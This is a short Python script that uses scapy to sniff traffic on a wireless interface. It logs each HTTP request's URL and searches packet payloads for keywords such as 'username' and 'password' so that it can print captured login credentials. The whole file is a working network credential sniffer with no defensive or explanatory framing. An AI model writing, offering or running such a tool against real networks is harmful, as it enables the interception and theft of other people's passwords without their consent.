#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
# from scapy_http import *

def snif(interfce):
    scapy.sniff(iface=interfce, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return  packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_logininfo(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "uname", "login", "password", "pass", "passwrd"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >>" + url)

        loginInfo = get_logininfo(packet)
        if loginInfo:
            print("\n\n[+] Possible Username/Password > " + loginInfo + "\n\n")




snif("wlan0")

